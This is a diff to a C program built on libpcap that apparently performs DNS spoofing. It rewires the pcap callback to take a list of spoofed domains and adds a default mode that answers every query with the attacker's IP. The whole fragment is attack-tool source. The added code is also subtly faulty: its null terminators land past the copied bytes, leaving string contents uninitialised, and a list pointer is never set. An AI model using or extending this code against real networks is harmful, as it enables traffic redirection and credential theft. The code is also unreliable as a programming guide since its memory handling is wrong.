@@ -143,7 +143,7 @@ void send_dns_reply(char* ip, u_int16_t port, char* packet, int packlen) {
 
 
 /* The callback function for pcap_loop */
-void dns_spoof(unsigned char *args, const struct pcap_pkthdr *header, const u_char *packet)
+void dns_spoof(struct node *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
 	struct ethernet_header *ether;
 	struct iphdr *ip;
@@ -163,6 +163,7 @@ void dns_spoof(unsigned char *args, const struct pcap_pkthdr *header, const u_ch
 	struct in_addr dest, src;
 
 
+	printf("%s - %s\n", args->spoof_ip, args->spoof_domain);
 	get_ip_of_attacker("ens33", spoof_ip);
 	memset(reply_packet, 0, PACKET_SIZE);
 
@@ -282,6 +283,7 @@ int main(int argc, char *argv[])
 	ssize_t read;
 	char delimiter[] = " \t\n";
 	char *token;
+	char spoof_ip[32];
 
 
 	memset(errbuf, 0, PCAP_ERRBUF_SIZE);
@@ -369,6 +371,14 @@ int main(int argc, char *argv[])
 			}
 		}
 		fclose(fp);
+	} else {
+		struct node *new_node = malloc(sizeof(struct node));
+		get_ip_of_attacker(dev, spoof_ip);
+		memcpy(new_node->spoof_ip, spoof_ip, 16);
+		new_node->spoof_ip[17] = '\0';
+		memcpy(new_node->spoof_domain, "spoof_all", 9);
+		new_node->spoof_domain[10] = '\0';
+		head = new_node;
 	}
 
 
@@ -464,7 +474,7 @@ int main(int argc, char *argv[])
 	}
 
 	/* set our callback function with infinite pcap_loop */
-	pcap_loop(handle, -1, dns_spoof, filter_str);
+	pcap_loop(handle, -1, (pcap_handler)dns_spoof, (u_char *)head);
 
 	/* clean up */
 	pcap_freecode(&fp);
